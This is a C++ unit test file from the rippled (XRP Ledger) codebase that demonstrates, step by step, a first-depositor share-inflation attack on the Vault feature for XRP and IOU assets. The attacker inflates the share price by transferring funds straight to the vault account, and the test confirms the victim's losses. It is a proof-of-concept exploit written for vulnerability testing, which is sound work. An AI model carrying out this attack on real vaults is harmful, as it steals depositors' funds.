//------------------------------------------------------------------------------
/*
  This file is part of rippled: https://github.com/ripple/rippled
  Copyright (c) 2025 Ripple Labs Inc.

  Permission to use, copy, modify, and/or distribute this software for any
  purpose  with  or without fee is hereby granted, provided that the above
  copyright notice and this permission notice appear in all copies.

  THE  SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
  WITH  REGARD  TO  THIS  SOFTWARE  INCLUDING  ALL  IMPLIED  WARRANTIES  OF
  MERCHANTABILITY  AND  FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
  ANY  SPECIAL ,  DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
  WHATSOEVER  RESULTING  FROM  LOSS  OF USE, DATA OR PROFITS, WHETHER IN AN
  ACTION  OF  CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
  OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
//==============================================================================

/**
 * SECURITY VULNERABILITY TEST
 * 
 * This test demonstrates a CRITICAL vulnerability in the Vault system:
 * First Depositor / Share Inflation Attack
 * 
 * Severity: CRITICAL - Direct theft of funds
 * 
 * Attack Vector:
 * 1. Attacker deposits minimal amount (1 unit) to empty vault
 * 2. Attacker directly transfers large amount to vault pseudo-account
 * 3. This inflates share price without issuing new shares
 * 4. Victim deposits and receives 0 or minimal shares due to truncation
 * 5. Attacker withdraws, stealing victim's funds
 * 
 * Impact: Attacker can steal up to 99%+ of victim deposits
 */

#include <test/jtx.h>
#include <test/jtx/amount.h>
#include <test/jtx/vault.h>

#include <xrpl/beast/unit_test/suite.h>
#include <xrpl/protocol/Feature.h>
#include <xrpl/protocol/Indexes.h>
#include <xrpl/protocol/SField.h>
#include <xrpl/protocol/STAmount.h>
#include <xrpl/protocol/TER.h>

namespace ripple {

class Vault_FirstDepositorAttack_test : public beast::unit_test::suite
{
    using PrettyAsset = ripple::test::jtx::PrettyAsset;
    using PrettyAmount = ripple::test::jtx::PrettyAmount;

    void
    testFirstDepositorAttackXRP()
    {
        testcase("First Depositor Attack - XRP Vault");

        using namespace test::jtx;

        Account attacker{"attacker"};
        Account victim{"victim"};
        Account vaultOwner{"vaultOwner"};

        Env env{*this, features};

        // Setup: Fund accounts
        auto const initialFunds = XRP(100000);
        env.fund(initialFunds, attacker, victim, vaultOwner);
        env.close();

        // Create vault
        Vault vault{env};
        auto const assetXRP = XRP.asset();
        auto [createTx, vaultKeylet] = 
            vault.create({.owner = vaultOwner, .asset = assetXRP});
        env(createTx);
        env.close();

        // Get vault pseudo-account
        auto const vaultSle = env.le(vaultKeylet);
        BEAST_REQUIRE(vaultSle);
        auto const vaultPseudo = Account{vaultSle->at(sfAccount)};
        auto const shareAsset = PrettyAsset{MPTIssue(vaultSle->at(sfShareMPTID))};

        log << "\n=== ATTACK PHASE 1: Attacker deposits minimal amount ===" << std::endl;
        
        // Attacker deposits 1 XRP to get initial shares
        env(vault.deposit({.depositor = attacker, .id = vaultKeylet.key, .amount = XRP(1)}));
        env.close();

        auto attackerShares1 = env.balance(attacker, shareAsset);
        auto vaultAssets1 = (*env.le(vaultKeylet))[sfAssetsTotal].value();
        
        log << "Attacker deposited: 1 XRP" << std::endl;
        log << "Attacker received shares: " << attackerShares1 << std::endl;
        log << "Vault AssetsTotal: " << vaultAssets1 << std::endl;

        BEAST_EXPECT(attackerShares1 > STAmount{shareAsset.raw(), 0});

        log << "\n=== ATTACK PHASE 2: Attacker inflates share price ===" << std::endl;

        // Attacker directly sends 10,000 XRP to vault pseudo-account
        // This increases AssetsTotal without issuing shares
        auto const inflationAmount = XRP(10000);
        env(pay(attacker, vaultPseudo, inflationAmount));
        env.close();

        auto attackerShares2 = env.balance(attacker, shareAsset);
        auto vaultAssets2 = (*env.le(vaultKeylet))[sfAssetsTotal].value();
        
        log << "Attacker sent directly to vault: " << inflationAmount << std::endl;
        log << "Attacker shares (unchanged): " << attackerShares2 << std::endl;
        log << "Vault AssetsTotal: " << vaultAssets2 << std::endl;
        log << "Share price inflated to: " << vaultAssets2 << " / " 
            << attackerShares2 << " = " 
            << (vaultAssets2 / attackerShares2.value()) << " XRP per share" << std::endl;

        BEAST_EXPECT(attackerShares2 == attackerShares1);  // Shares unchanged
        BEAST_EXPECT(vaultAssets2 > vaultAssets1);  // Assets increased

        log << "\n=== ATTACK PHASE 3: Victim deposits ===" << std::endl;

        // Victim deposits 5,000 XRP
        auto const victimDeposit = XRP(5000);
        auto victimBalanceBefore = env.balance(victim, assetXRP);
        
        env(vault.deposit({.depositor = victim, .id = vaultKeylet.key, .amount = victimDeposit}));
        env.close();

        auto victimShares = env.balance(victim, shareAsset);
        auto victimBalanceAfter = env.balance(victim, assetXRP);
        auto vaultAssets3 = (*env.le(vaultKeylet))[sfAssetsTotal].value();
        
        log << "Victim deposited: " << victimDeposit << std::endl;
        log << "Victim received shares: " << victimShares << std::endl;
        log << "Vault AssetsTotal: " << vaultAssets3 << std::endl;

        // Due to truncation, victim receives very few or zero shares
        auto totalShares = attackerShares2 + victimShares;
        log << "Total shares outstanding: " << totalShares << std::endl;
        log << "Attacker owns: " << (attackerShares2.value() * 100 / totalShares.value()) 
            << "% of shares" << std::endl;
        log << "Victim owns: " << (victimShares.value() * 100 / totalShares.value()) 
            << "% of shares" << std::endl;

        log << "\n=== ATTACK PHASE 4: Attacker withdraws ===" << std::endl;

        // Attacker withdraws their shares
        auto attackerBalanceBefore = env.balance(attacker, assetXRP);
        
        env(vault.withdraw({.depositor = attacker, .id = vaultKeylet.key, .amount = attackerShares2}));
        env.close();

        auto attackerBalanceAfter = env.balance(attacker, assetXRP);
        auto attackerProfit = attackerBalanceAfter - attackerBalanceBefore;
        
        log << "Attacker withdrew shares: " << attackerShares2 << std::endl;
        log << "Attacker received assets: " << attackerProfit << std::endl;

        log << "\n=== ATTACK RESULT ===" << std::endl;
        
        // Calculate attacker's total cost and profit
        auto attackerTotalCost = XRP(1) + inflationAmount;  // Initial deposit + direct transfer
        auto attackerNetProfit = attackerProfit - attackerTotalCost;
        
        log << "Attacker total investment: " << attackerTotalCost << std::endl;
        log << "Attacker total return: " << attackerProfit << std::endl;
        log << "Attacker NET PROFIT: " << attackerNetProfit << std::endl;

        // Victim tries to withdraw
        auto victimBalanceBeforeWithdraw = env.balance(victim, assetXRP);
        
        if (victimShares > STAmount{shareAsset.raw(), 0})
        {
            env(vault.withdraw({.depositor = victim, .id = vaultKeylet.key, .amount = victimShares}));
            env.close();
            
            auto victimBalanceAfterWithdraw = env.balance(victim, assetXRP);
            auto victimRecovered = victimBalanceAfterWithdraw - victimBalanceBeforeWithdraw;
            auto victimLoss = victimDeposit - victimRecovered;
            
            log << "Victim withdrew shares: " << victimShares << std::endl;
            log << "Victim received assets: " << victimRecovered << std::endl;
            log << "Victim LOSS: " << victimLoss << std::endl;
            
            // Verify the attack was successful
            BEAST_EXPECT(victimLoss > XRP(0));
            log << "\n*** VULNERABILITY CONFIRMED: Victim lost " << victimLoss 
                << " (" << (victimLoss.value() * 100 / victimDeposit.value()) << "%) ***" << std::endl;
        }
        else
        {
            log << "Victim received ZERO shares - total loss!" << std::endl;
            log << "\n*** VULNERABILITY CONFIRMED: Victim lost entire deposit of " 
                << victimDeposit << " (100%) ***" << std::endl;
        }
    }

    void
    testFirstDepositorAttackIOU()
    {
        testcase("First Depositor Attack - IOU Vault");

        using namespace test::jtx;

        Account attacker{"attacker"};
        Account victim{"victim"};
        Account vaultOwner{"vaultOwner"};
        Account issuer{"issuer"};

        Env env{*this, features};

        // Setup: Fund accounts
        env.fund(XRP(10000), attacker, victim, vaultOwner, issuer);
        env.close();

        // Create trust lines
        auto const USD = issuer["USD"];
        env(trust(attacker, USD(100000)));
        env(trust(victim, USD(100000)));
        env.close();

        // Issue currency
        env(pay(issuer, attacker, USD(50000)));
        env(pay(issuer, victim, USD(50000)));
        env.close();

        // Create vault
        Vault vault{env};
        auto const assetUSD = USD.asset();
        auto [createTx, vaultKeylet] = 
            vault.create({.owner = vaultOwner, .asset = assetUSD});
        env(createTx);
        env.close();

        // Get vault pseudo-account
        auto const vaultSle = env.le(vaultKeylet);
        BEAST_REQUIRE(vaultSle);
        auto const vaultPseudo = Account{vaultSle->at(sfAccount)};
        auto const shareAsset = PrettyAsset{MPTIssue(vaultSle->at(sfShareMPTID))};

        // Setup trust for vault pseudo-account
        env(trust(vaultPseudo, USD(1000000)));
        env.close();

        log << "\n=== IOU ATTACK PHASE 1: Attacker deposits minimal amount ===" << std::endl;
        
        // Attacker deposits 0.000001 USD to get initial shares
        env(vault.deposit({.depositor = attacker, .id = vaultKeylet.key, .amount = USD(0.000001)}));
        env.close();

        auto attackerShares1 = env.balance(attacker, shareAsset);
        auto vaultAssets1 = (*env.le(vaultKeylet))[sfAssetsTotal].value();
        
        log << "Attacker deposited: 0.000001 USD" << std::endl;
        log << "Attacker received shares: " << attackerShares1 << std::endl;
        log << "Vault AssetsTotal: " << vaultAssets1 << std::endl;

        log << "\n=== IOU ATTACK PHASE 2: Attacker inflates share price ===" << std::endl;

        // Attacker directly sends 10,000 USD to vault pseudo-account
        auto const inflationAmount = USD(10000);
        env(pay(attacker, vaultPseudo, inflationAmount));
        env.close();

        auto attackerShares2 = env.balance(attacker, shareAsset);
        auto vaultAssets2 = (*env.le(vaultKeylet))[sfAssetsTotal].value();
        
        log << "Attacker sent directly to vault: " << inflationAmount << std::endl;
        log << "Attacker shares (unchanged): " << attackerShares2 << std::endl;
        log << "Vault AssetsTotal: " << vaultAssets2 << std::endl;

        log << "\n=== IOU ATTACK PHASE 3: Victim deposits ===" << std::endl;

        // Victim deposits 5,000 USD
        auto const victimDeposit = USD(5000);
        
        env(vault.deposit({.depositor = victim, .id = vaultKeylet.key, .amount = victimDeposit}));
        env.close();

        auto victimShares = env.balance(victim, shareAsset);
        auto vaultAssets3 = (*env.le(vaultKeylet))[sfAssetsTotal].value();
        
        log << "Victim deposited: " << victimDeposit << std::endl;
        log << "Victim received shares: " << victimShares << std::endl;

        auto totalShares = attackerShares2 + victimShares;
        log << "Attacker owns: " << (attackerShares2.value() * 100 / totalShares.value()) 
            << "% of shares" << std::endl;

        log << "\n=== IOU ATTACK PHASE 4: Results ===" << std::endl;

        // Attacker withdraws
        auto attackerBalanceBefore = env.balance(attacker, assetUSD);
        env(vault.withdraw({.depositor = attacker, .id = vaultKeylet.key, .amount = attackerShares2}));
        env.close();

        auto attackerBalanceAfter = env.balance(attacker, assetUSD);
        auto attackerWithdrew = attackerBalanceAfter - attackerBalanceBefore;
        
        log << "Attacker withdrew: " << attackerWithdrew << std::endl;

        // Victim withdraws if possible
        if (victimShares > STAmount{shareAsset.raw(), 0})
        {
            auto victimBalanceBefore = env.balance(victim, assetUSD);
            env(vault.withdraw({.depositor = victim, .id = vaultKeylet.key, .amount = victimShares}));
            env.close();
            
            auto victimBalanceAfter = env.balance(victim, assetUSD);
            auto victimWithdrew = victimBalanceAfter - victimBalanceBefore;
            auto victimLoss = victimDeposit - victimWithdrew;
            
            log << "Victim withdrew: " << victimWithdrew << std::endl;
            log << "Victim LOSS: " << victimLoss << std::endl;
            
            BEAST_EXPECT(victimLoss > USD(0));
            log << "\n*** IOU VULNERABILITY CONFIRMED ***" << std::endl;
        }
        else
        {
            log << "*** IOU VULNERABILITY CONFIRMED: Victim received ZERO shares ***" << std::endl;
        }
    }

    void
    run() override
    {
        testFirstDepositorAttackXRP();
        testFirstDepositorAttackIOU();
    }

    FeatureBitset const features{
        featureSingleAssetVault,
        featureCredentials,
        featureMPTokensV1,
        featureBatch};
};

BEAST_DEFINE_TESTSUITE(Vault_FirstDepositorAttack, app, ripple);

}  // namespace ripple
